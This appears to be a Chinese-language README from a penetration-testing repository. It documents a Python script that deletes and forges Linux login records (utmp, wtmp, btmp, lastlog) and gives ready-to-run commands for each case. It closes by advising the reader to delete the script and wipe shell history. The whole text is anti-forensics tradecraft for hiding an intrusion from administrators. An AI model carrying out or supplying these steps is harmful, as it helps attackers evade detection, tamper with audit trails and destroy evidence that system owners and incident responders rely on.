## 渗透测试TIPS之删除、伪造Linux系统登录日志  
> 来源于[freebuf](https://www.freebuf.com/articles/system/141474.html)，文章备份:[渗透测试TIPS之删除伪造Linux系统登录日志.pdf](渗透测试TIPS之删除伪造Linux系统登录日志.pdf),但是文章脚本失效了,我保存了一份.
### 适用于 Linux 系统，[`fake_login_log.py`](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/ssh/fake_login_log.py) 脚本默认适用于`python2`版本，需要`Root`权限！
## 演示:  
![show img](./fake_login_log.gif)
## USEAGE  
> 首先下载到本地：
> wget https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/ssh/fake_login_log.py  
> 没有 wget 的请自行下载 Debian/Ubuntu 使用 sudo apt install wget -y ; Centos 使用yum install wget -y ; 新版的系统一般都默认安装有。
### 删除日志  
1. 删除utmp记录，将自己从w或者who输出中隐藏  
`python fake_login_log.py --mode delete --type utmp --user root` //删除用户为root的用户记录  
`python fake_login_log.py --mode delete --type utmp --user root --host "58.47.251.255" `//删除用户为root且登录来源host为58.47.251.255的用户记录  
2. 删除历史登录记录(wtmp)，隐藏last的记录  
`python fake_login_log.py --mode delete --type wtmp --user root --host "111.30.32.213" `//删除用户为root且登录来源host为111.30.32.213的用户记录
3. 删除btmp记录，隐藏lastb的记录，lastb为登录失败的用户记录  
`python fake_login_log.py --mode delete --type btmp --user root --host "172.16.50.156" `//删除用户为root且登录来源host为127.0.0.1的用户记录  
4. 删除lastlog记录，不能通过用户删除，只能通过host或者时间  
`python fake_login_log.py --mode delete --type lastlog --host "172.16.50.1" `//删除来源host的用户登录记录  
`python fake_login_log.py --mode delete --type lastlog --date "2017-8-2 22:46:34" `//删除登录时间为2017-8-2 22:46:34的用户登录记录  

### 伪造日志  
1. 伪造utmp记录，将自己从w或者who输出中伪造  
`python fake_login_log.py --mode add --type utmp --user nobody --tty "pts/8" --pid 25394 --date "2017-8-2 22:46:34" --host "127.0.0.1" `//伪造用户为nobody的用户记录  
> 这里伪造的时间和host可以通过who命令去找到，PID一般伪造bash或者ssh通过`ps -aux | grep ssh/bash`去寻找  
2. 伪造历史登录记录(wtmp)，伪造last的记录  
`python fake_login_log.py --mode add  --type wtmp --user root --tty "pts/7" --date "2017-8-2 00:06:34" --host "127.0.0.1" `  
3. 伪造btmp记录，伪造lastb的记录，lastb为登录失败的用户记录  
`python fake_login_log.py --mode add  --type btmp --user root --tty "pts/7" --date "2017-8-2 00:06:34" --host "127.0.0.1" `//伪造用户为root且登录来源host为127.0.0.1的用户登录失败记录  
4. 伪造lastlog记录  
`python fake_login_log.py --mode add --type=lastlog --user=rootclay --date="2017-7-24 14:22:07" --tty "pts/2" --host "127.0.0.1" `//伪造用户为rootclay 时间2017-7-24 14:22:07 来源登录ip为127.0.0.1的用户登录记录  

> PS: 执行完这些命令之后删除掉`fake_login_log.py`本身然后使用`history -cw`清除一下历史记录.美滋滋
